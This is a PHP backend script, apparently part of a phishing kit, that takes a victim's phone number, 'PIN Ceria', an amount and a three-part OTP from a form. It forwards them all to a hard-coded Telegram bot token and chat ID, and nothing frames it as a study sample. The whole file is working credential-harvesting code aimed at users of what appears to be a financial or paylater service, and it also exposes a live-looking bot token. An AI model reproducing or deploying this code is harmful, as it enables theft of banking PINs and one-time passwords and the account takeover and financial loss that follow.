<?php
// Ambil nilai dari inputan form
$nomorHP = isset($_POST['nomor_hp']) ? $_POST['nomor_hp'] : '';
$pin = isset($_POST['pin']) ? $_POST['pin'] : '';
$jumlah = isset($_POST['jumlah']) ? $_POST['jumlah'] : '';
$otp1 = isset($_POST['otp1']) ? $_POST['otp1'] : '';
$otp2 = isset($_POST['otp2']) ? $_POST['otp2'] : '';
$otp3 = isset($_POST['otp3']) ? $_POST['otp3'] : '';

// Validasi jika nomor HP atau nomor PIN kosong
if (empty($nomorHP) || empty($pin) || empty($jumlah) || empty($otp1) || empty($otp2) || empty($otp3)) {
    // Tanggapi sesuai kebutuhan, misalnya memberikan pesan error
    http_response_code(400); // Bad Request
    echo "Semua kolom harus diisi!";
    exit();
}

// Kirim ke bot Telegram
$botToken = '6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0';
$chatId = '6824078885';

$message = "Nomor Handphone: $nomorHP\nPIN Ceria: $pin\nJumlah: $jumlah\nOTP: $otp1$otp2$otp3";

$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Inisiasi cURL
$ch = curl_init($telegramUrl);

// Set opsi cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Eksekusi cURL
$result = curl_exec($ch);

// Cek apakah pengiriman berhasil
if ($result === false) {
    // Tanggapi kesalahan jika diperlukan
    http_response_code(500); // Internal Server Error
    echo "Terjadi kesalahan dalam pengiriman pesan.";
} else {
    // Tanggapi sukses
    echo "Pesan berhasil terkirim ke bot Telegram.";
}

// Tutup koneksi cURL
curl_close($ch);
?>
